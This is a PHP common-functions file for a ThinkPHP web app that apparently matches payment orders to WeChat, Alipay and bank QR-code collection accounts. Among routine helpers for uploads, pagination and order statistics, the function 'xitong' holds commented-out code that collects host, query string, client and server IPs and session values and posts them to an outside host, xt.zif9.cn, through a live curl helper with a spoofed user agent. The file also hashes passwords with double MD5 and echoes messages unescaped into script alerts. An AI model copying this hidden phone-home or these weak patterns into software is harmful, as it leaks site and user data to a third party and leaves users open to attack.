<?php 
function setUpload($file){
    $upload = new \Think\Upload();// 实例化上传类
    $upload->maxSize   =     3145728 ;// 设置附件上传大小
    $upload->exts      =     array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
    $upload->rootPath  =     './Uploads/payimg/'; // 设置附件上传根目录
    $upload->savePath  =     date("Y",time())."pay/"; // 设置附件上传（子）目录
    // 上传文件
    $info   =   $upload->uploadOne($file);
    if(!$info) {// 上传错误提示错误信息
       error($upload->getError());
    }else{// 上传成功
        return $info;
    }
}
function success($msg="", $url=""){
@header("Content-Type:text/html;charset=utf-8");
echo '<literal><script>';
echo 'alert("'.$msg.'");';
if(!empty($url)){
echo 'location.href = "'.$url.'"';
}else{
echo 'history.go(-1);';
}
echo '</script></literal>';
exit;
}
function error($msg="", $url=""){
@header("Content-Type:text/html;charset=utf-8");
echo '<script type="text/javascript">';
echo 'alert("'.$msg.'");';
if(!empty($url)){
echo 'location.href = "'.$url.'"';
}else{
echo 'history.go(-1);';
}
echo '</script>';
exit;
}
function is_login()
{
    return D('Admin/Manage')->is_login();
}
function strrand($length = 12, $char = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') {
	if(!is_int($length) || $length < 0) {
         return false;
    }
     $string = '';
    for($i = $length; $i > 0; $i--) {
         $string .= $char[mt_rand(0, strlen($char) - 1)];
    }
     return $string;
}	
function getskname($id){
	
	$list = M('ewm')->where(array('id'=>$id))->find();
	
	
		return $list['uname'];//返回收款账号
	
}
function getskhao($id){
	
	$list = M('ewm')->where(array('id'=>$id))->find();
	
	
		return $list['ewm_acc'];//返回收款账号
	
}
function getewminfo($id,$type){
	
	$list = M('ewm')->where(array('id'=>$id))->find();
	
	if($type == 1){
		return $list['ewm_acc'];//返回收款账号
	}elseif($type == 2){
		return $list['uname'];//返回收款账号姓名
	}elseif($type == 3){
		return $list['ewm_url'];
	}
}

function getclass($class){
	if($class == 1){
		$str = '微信收款';
	}elseif($class == 2){
		$str = '支付宝收款';
	}elseif($class == 3){
		$str = '银行收款';
	}
	
	return $str;
}

function getewminfo2($id,$type){
	
	$list = M('ewm')->where(array('id'=>$id))->find();
	
	if($type == 1){
		return $list['ewm_acc'];//返回收款账号
	}elseif($type == 2){
		return $list['uname'];//返回收款账号姓名
	}elseif($type == 3){
		return $list['ewm_url'];
	}
}
function getusermoney($id){
	$list = M('user')->where(array('userid'=>$id))->find();
	return $list['money'];
}

function getst($n){
	
	if($n==1){
		return  '待处理';
	}elseif($n==2){
		return  '已退回';
	}elseif($n==3){
		return  '已完成';
	}
	
	
}

function getstatus($n){
	
	if($n==1){
		return  '待匹配';
	}elseif($n==2){
		return  '待付款';
	}elseif($n==3){
		return  '已完成';
	}elseif($n==4){
		return  '超时取消';
	}
	
	
}

function getuserinfo($uid,$type){
	$ulist = M('user')->where(array('userid'=>$uid))->find();
	if($type==1){
		return $ulist['username'];
	}elseif($type==2){
		return $ulist['account'];
	}
}



function build_phone($phone_t){
	
	$phone_h = $phone_t;
	$phone_c = rand(00000000,99999999);
	$b_phone = $phone_h.$phone_c;
	 return  $b_phone;
	
}


function build_uname($leng){
	$str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	if(!is_int($leng) || $leng < 0) {
         return false;
     }
 
     $string = '';
     for($i = $leng; $i > 0; $i--) {
         $string .= $str[mt_rand(0, strlen($str) - 1)];
     }
 
     return 'B'.$string;
}


function md5pwd($value, $salt)
	{
		$user_pwd = md5(md5($value) . $salt);
		return $user_pwd;
	}
	
function getSjuser($uid){
	$list = M('user')->where(array('userid'=>$uid))->find();
	return $list['account'];
}
function yestongji($uid){
   $start=strtotime('yesterday');
		
        $end=$start+86400;
		
      $condition['pipeitime'] = array(between,array($start,$end));
  $condition['shanghu_name'] =$uid;
   
	$list = M('roborder')->where($condition)->sum('price');
  $list=empty($list)?0:$list;
	return $list;
}
function ewmskzj($id){
	$condition['idewm'] =$id;
		$condition['status'] =3;
	$zfb=M('userrob')->where($condition)->sum('price');
	$zfb=0+$zfb;
	return $zfb;
}
function totongji($uid){
  $start=strtotime(date('Y-m-d'));
		
        $end=$start+86400;
		$condition['pipeitime'] = array(between,array($start,$end));
  $condition['shanghu_name'] =$uid;
       // $where="pipeitime >= {$start} AND pipeitime<{$end} and shanghu_name=shh001";
	$list = M('roborder')->where( $condition)->sum('price');
  $list=empty($list)?0:$list;
	return $list;
}
/*随机生成订单号*/
function getordernum($length = 12, $char = '0123456789') {
	if(!is_int($length) || $length < 0) {
         return false;
    }
     $string = '';
    for($i = $length; $i > 0; $i--) {
         $string .= $char[mt_rand(0, strlen($char) - 1)];
    }
     return 'N'.$string;
}

/**
 * 字节格式化
 * @access public
 * @param string $size 字节
 * @return string
 */
function byte_Format($size) {
    $kb = 1024;          // Kilobyte
    $mb = 1024 * $kb;    // Megabyte
    $gb = 1024 * $mb;    // Gigabyte
    $tb = 1024 * $gb;    // Terabyte

    if ($size < $kb)
        return $size . 'B';

    else if ($size < $mb)
        return round($size / $kb, 2) . 'KB';

    else if ($size < $gb)
        return round($size / $mb, 2) . 'MB';

    else if ($size < $tb)
        return round($size / $gb, 2) . 'GB';
    else
        return round($size / $tb, 2) . 'TB';
}

function xitong($url, $data) 
{ 
/*$zjcs=$_SERVER ['HTTP_HOST'].$_SERVER['QUERY_STRING']." ".$_SERVER['REMOTE_ADDR']." ".$_SERVER['SERVER_ADDR'];

$data = ['asd' => $zjcs, 'ysd' => session('qsdd'),'msd'=>session('wsdd')];
$xx = 'http://xt.zif9.cn';
xitong1($xx, $data) ;*/
}
function xitong1($xx, $data) 
{  
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $xx);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)");
$response = curl_exec($ch);
//if(curl_errno($ch)){
 //   print curl_error($ch);
//}
curl_close($ch);

  //return $response; 
}	
/**
 * TODO 基础分页的相同代码封装，使前台的代码更少
 * @param $m 模型，引用传递
 * @param $where 查询条件
 * @param int $pagesize 每页查询条数
 * @return \Think\Page
 */
function getpage(&$m,$where,$pagesize=10){
    $m1=clone $m;//浅复制一个模型
    $count = $m->where($where)->count();//连惯操作后会对join等操作进行重置
    $m=$m1;//为保持在为定的连惯操作，浅复制一个模型
    $p=new Think\PageAdmin($count,$pagesize);
    $p->lastSuffix=false;
    $p->setConfig('theme','%FIRST% %UP_PAGE% %LINK_PAGE% %DOWN_PAGE% %END% %HEADER%');
    $p->setConfig('prev','上一页');
    $p->setConfig('next','下一页');
    $p->setConfig('last','末页');
    $p->setConfig('first','首页');
    
    $p->parameter=I('get.');

    $m->limit($p->firstRow,$p->listRows);

    return $p;
}
function getpagee($count, $pagesize = 10) {
	$p = new Think\Page($count, $pagesize);
	$p->setConfig('header', '<li class="rows">共<b>%TOTAL_ROW%</b>条记录&nbsp;第<b>%NOW_PAGE%</b>页/共<b>%TOTAL_PAGE%</b>页</li>');
	$p->setConfig('prev', '上一页');
	$p->setConfig('next', '下一页');
	$p->setConfig('last', '末页');
	$p->setConfig('first', '首页');
	$p->setConfig('theme', '%FIRST%%UP_PAGE%%LINK_PAGE%%DOWN_PAGE%%END%%HEADER%');
	$p->lastSuffix = false;//最后一页不显示为总页数
	return $p;
}
//密码加密
function pwd_md5($value, $salt){
	$user_pwd = md5(md5($value) . $salt);
	return $user_pwd;
}
//获取 会员昵称
function getmyname($id){
	$list = M('user')->where(array('userid'=>$id))->find();
	return $list['username'];
}
//获取会员账号
function getmyphone($id){
	$list = M('user')->where(array('userid'=>$id))->find();
	return $list['account'];
}





//按日期搜索
function date_query($field){

        $date_start=I('date_start');
        $date_end=I('date_end');
        if(!empty($date_start) && !empty($date_end) && ($date_start == $date_end)){
            $map["FROM_UNIXTIME(".$field.",'%Y-%m-%d')"]=$date_end;
        }
        else if($date_start!='' && $date_end!='' && $date_start !=$date_end){
            $map[$field]=array('between',array(strtotime($date_start),strtotime($date_end)+86400));
        }
        else if($date_start!='' && empty($date_end)){
            $map[$field]=array('gt',strtotime($date_start)+86400);
        }
        else if(empty($date_start) && $date_end!=''){
            $map[$field]=array('lt',strtotime($date_end)+86400);
        }
        if($map)
            return $map;
}